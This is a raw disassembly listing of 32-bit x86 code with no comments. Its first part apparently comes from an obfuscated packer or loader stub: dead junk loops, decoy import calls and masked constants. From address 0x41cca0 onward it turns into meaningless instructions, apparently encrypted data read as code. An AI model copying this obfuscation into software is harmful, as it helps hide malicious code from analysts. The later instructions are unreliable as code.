  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x423822
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a46
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423978
  41c5ea:	push   0x4238dd
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423953
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42393e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a74
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x58d7ebdc
  41ccad:	fbld   TBYTE PTR [esi]
  41ccaf:	adc    DWORD PTR [edi+0x3c6261fc],0x5f
  41ccb6:	bound  esp,QWORD PTR [edx+0x35]
  41ccb9:	nop
  41ccba:	fdiv   QWORD PTR [ebp+0xe]
  41ccbd:	and    al,0xfc
  41ccbf:	(bad)  
  41ccc0:	repz pop ds
  41ccc2:	xor    esp,DWORD PTR [ebx+ebp*4-0xa643b86]
  41ccc9:	or     BYTE PTR [ebx-0x3],ch
  41cccc:	add    al,0xe
  41ccce:	mov    eax,ds:0x25087479
  41ccd3:	and    DWORD PTR [edx-0x4ec188cc],0xe85f89f9
  41ccdd:	daa    
  41ccde:	and    eax,0xa73693cf
  41cce3:	jmp    0x41cce5
  41cce5:	xor    eax,0xd8e9a91c
  41ccea:	and    ebx,DWORD PTR [ecx+eiz*8-0x80]
  41ccee:	mov    WORD PTR [edx],?
  41ccf0:	adc    dh,dh
  41ccf2:	xor    al,0x29
  41ccf4:	mov    esi,0xb7a83818
  41ccf9:	icebp  
  41ccfa:	stos   BYTE PTR es:[edi],al
  41ccfb:	out    0x54,eax
  41ccfd:	jmp    0xb4e7:0x5b24a32c
  41cd04:	je     0x41cce5
  41cd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd07:	jnp    0x41ccec
  41cd09:	pop    ds
  41cd0a:	mov    ds:0xa2e02190,eax
  41cd0f:	xor    ch,BYTE PTR [ebp+0x5c]
  41cd12:	aaa    
  41cd13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd14:	dec    ebp
  41cd15:	leave  
  41cd16:	mov    cl,0xa4
  41cd18:	out    0xf9,eax
  41cd1a:	loope  0x41cce9
  41cd1c:	dec    edi
  41cd1d:	out    dx,al
  41cd1e:	mov    al,0xfe
  41cd20:	push   DWORD PTR [ebx+0x9fe1d50]
  41cd26:	mov    bh,0x1e
  41cd28:	adc    al,0x3b
  41cd2a:	push   0x321d5761
  41cd2f:	add    al,0xe2
  41cd31:	call   0x3c1e7942
  41cd36:	and    edi,DWORD PTR ds:0x3c06f9e4
  41cd3c:	xor    bl,ch
  41cd3e:	call   0x496ae7b6
  41cd43:	mov    BYTE PTR [esi-0x463bb55d],dl
  41cd49:	inc    ebp
  41cd4a:	leave  
  41cd4b:	pop    esi
  41cd4c:	pusha  
  41cd4d:	mov    ds:0xcaae5380,eax
  41cd52:	and    eax,0x3a0c28b8
  41cd57:	jg     0x41cd71
  41cd59:	and    al,0x18
  41cd5b:	cmp    al,BYTE PTR [edx+0x79c791fd]
  41cd61:	xchg   ebx,eax
  41cd62:	scas   eax,DWORD PTR es:[edi]
  41cd63:	sub    edi,DWORD PTR [esi]
  41cd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd66:	sub    ebp,ebx
  41cd68:	xor    BYTE PTR [eax],ch
  41cd6a:	sub    cl,cl
  41cd6c:	mov    bl,0x39
  41cd6e:	dec    eax
  41cd6f:	dec    edi
  41cd70:	mov    ebp,0x920dfee
  41cd75:	mov    ebp,0xf4338afa
  41cd7a:	or     cl,cl
  41cd7c:	rol    DWORD PTR [esp+edx*4+0x5b],1
  41cd80:	mov    ds:0x451129e2,eax
  41cd85:	push   ds
  41cd86:	das    
  41cd87:	lods   eax,DWORD PTR ds:[esi]
  41cd88:	pusha  
  41cd89:	cmp    ebp,0x59
  41cd8c:	adc    dh,dh
  41cd8e:	pop    ebx
  41cd8f:	push   edx
  41cd90:	add    DWORD PTR [ebx-0x29],ecx
  41cd93:	dec    edi
  41cd94:	dec    esp
  41cd95:	(bad)  
  41cd96:	lods   al,BYTE PTR ds:[esi]
  41cd97:	out    0xd1,eax
  41cd99:	xor    eax,eax
  41cd9b:	rcr    DWORD PTR [edi+0x2f600baa],0xb2
  41cda2:	xor    dl,cl
  41cda4:	ins    DWORD PTR es:[edi],dx
  41cda5:	in     eax,0x52
  41cda7:	mov    ah,0x6b
  41cda9:	mov    BYTE PTR ds:[ebx+ebp*1],al
  41cdad:	out    dx,al
  41cdae:	inc    ebx
  41cdaf:	sbb    ah,BYTE PTR ds:0x43a4666c
  41cdb5:	jnp    0x41ce2e
  41cdb7:	cmc    
  41cdb8:	gs retf 
  41cdba:	aas    
  41cdbb:	arpl   WORD PTR ds:[ebx+eax*4-0x4ac011e9],dx
  41cdc3:	jmp    0xeea3:0x79740459
  41cdca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdcb:	xchg   ebp,eax
  41cdcc:	aad    0xec
  41cdce:	test   eax,0xa625ddf
  41cdd3:	inc    ebp
  41cdd4:	fnstsw WORD PTR [edi+0x5b]
  41cdd7:	fs aad 0x63
  41cdda:	pop    ecx
  41cddb:	push   0x48b720d5
  41cde0:	sub    esi,DWORD PTR [edx+0x4d28874f]
  41cde6:	push   edx
  41cde7:	push   0xa598048c
  41cdec:	stos   BYTE PTR es:[edi],al
  41cded:	fst    QWORD PTR [eax+0x90e9d9d]
  41cdf3:	inc    ebx
  41cdf4:	gs leave 
  41cdf6:	hlt    
  41cdf7:	mov    bh,0x3d
  41cdf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdfa:	stc    
  41cdfb:	fiadd  WORD PTR [eax+0x2b3b1ce0]
  41ce01:	inc    eax
  41ce02:	jne    0x41cda6
  41ce04:	push   ebp
  41ce05:	mov    bh,BYTE PTR [ecx+0x19529271]
  41ce0b:	retf   0xaef0
  41ce0e:	push   edx
  41ce0f:	(bad)  
  41ce10:	jle    0x41ce22
  41ce12:	jbe    0x41cdc2
  41ce14:	ret    
  41ce15:	mov    al,0x5f
  41ce17:	in     eax,dx
  41ce18:	xor    ebx,DWORD PTR [edi]
  41ce1a:	fiadd  DWORD PTR [edi+0x77]
  41ce1d:	and    ch,ah
  41ce1f:	dec    eax
  41ce20:	enter  0x9ba8,0x94
  41ce24:	pop    es
  41ce25:	arpl   WORD PTR [edi],bp
  41ce27:	jle    0x41ce53
  41ce29:	int    0x58
  41ce2b:	mov    fs,WORD PTR [edi+0xa71515e]
  41ce31:	imul   eax,DWORD PTR [esi-0x19],0xffffff90
  41ce35:	rcr    DWORD PTR ds:0x61ba5f3c,1
  41ce3b:	mov    dh,ah
  41ce3d:	or     al,0x4c
  41ce3f:	sbb    dh,cl
  41ce41:	xor    bp,WORD PTR [eax-0x58688b46]
  41ce48:	jecxz  0x41ce73
  41ce4a:	(bad)  
  41ce4b:	jmp    0x8fbf:0x2ff0aff2
  41ce52:	pushf  
  41ce53:	je     0x41cdec
  41ce55:	jge    0x41ce0c
  41ce57:	sbb    al,BYTE PTR [edi+0x2a931d31]
  41ce5d:	div    ah
  41ce5f:	lahf   
  41ce60:	and    esi,esp
  41ce62:	add    esi,DWORD PTR [eax-0x62]
  41ce65:	ds fdivp st(6),st
  41ce68:	cwde   
  41ce69:	pop    edx
  41ce6a:	mov    dl,dh
  41ce6c:	aas    
  41ce6d:	in     ax,0xcd
  41ce70:	test   bl,0x85
  41ce73:	mov    ebp,eax
  41ce75:	push   esp
  41ce76:	add    al,0x6d
  41ce78:	scas   al,BYTE PTR es:[edi]
  41ce79:	daa    
  41ce7a:	push   0x72
  41ce7c:	fwait
  41ce7d:	sub    eax,0x5da0c23a
  41ce82:	cmc    
  41ce83:	inc    eax
  41ce84:	mov    ch,BYTE PTR [ebp+0x43e6adef]
  41ce8a:	das    
  41ce8b:	sbb    bl,dh
  41ce8d:	psrad  mm0,mm4
  41ce90:	sub    ecx,esp
